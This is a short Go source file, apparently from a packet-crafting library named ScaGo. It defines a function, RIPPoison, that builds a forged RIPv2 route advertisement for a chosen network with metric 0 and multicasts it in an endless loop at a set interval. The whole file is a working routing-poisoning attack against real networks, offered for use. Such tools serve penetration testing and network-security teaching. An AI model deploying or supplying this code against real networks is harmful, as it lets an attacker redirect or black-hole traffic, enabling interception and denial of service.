package higherlevel

import (
	"github.com/tiagomdiogo/ScaGo/packet"
	communication "github.com/tiagomdiogo/ScaGo/supersocket"
	"github.com/tiagomdiogo/ScaGo/utils"
	"net"
	"time"
)

func RIPPoison(network, subnet_mask, iface string, interval int) {
	ipLayer := packet.IPv4Layer()
	ipLayer.SetSrcIP(utils.IPbyInt(iface))
	ipLayer.SetDstIP("224.0.0.9")

	udpLayer := packet.UDPLayer()
	udpLayer.SetSrcPort("520")
	udpLayer.SetDstPort("520")

	ripLayer := packet.RIPLayer()
	ripLayer.SetCommand(2)
	ripLayer.SetVersion(2)
	ripLayer.AddEntry(2, 0, net.ParseIP(network), net.ParseIP(subnet_mask), net.ParseIP("0.0.0.0"), 0)

	pkt, _ := packet.CraftPacket(ipLayer.Layer(), udpLayer.Layer(), ripLayer.Layer())

	ticker := time.NewTicker(time.Duration(interval) * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			communication.Send(pkt, iface)
		}
	}
}
